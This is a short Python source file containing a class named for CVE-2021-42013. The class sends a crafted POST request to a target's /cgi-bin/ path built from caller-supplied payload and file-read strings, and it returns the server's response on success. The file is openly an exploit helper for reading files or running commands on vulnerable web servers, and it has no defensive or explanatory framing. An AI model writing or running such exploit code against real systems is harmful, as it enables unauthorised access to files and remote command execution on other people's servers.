import http.client
from typing import Union


class CVE_2021_42013:
    def __init__(self, target_ip: str, target_port: str, payload: str, file_read: str, data: str) -> None:
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload = payload
        self.file_read = file_read
        self.data = data

    def check_vuln(self) -> Union[str, None]:
        path = f"/cgi-bin/{self.payload}{self.file_read}"

        try:
            conn = http.client.HTTPConnection(self.target_ip, self.target_port)
            headers = {
                "Content-Type": "text/plain"
            }
            conn.request("POST", path, self.data, headers)
            response = conn.getresponse()
            data = response.read().decode()
            conn.close()

            if response.status == 200:
                return data
            else:
                return None
        except Exception as e:
            return None
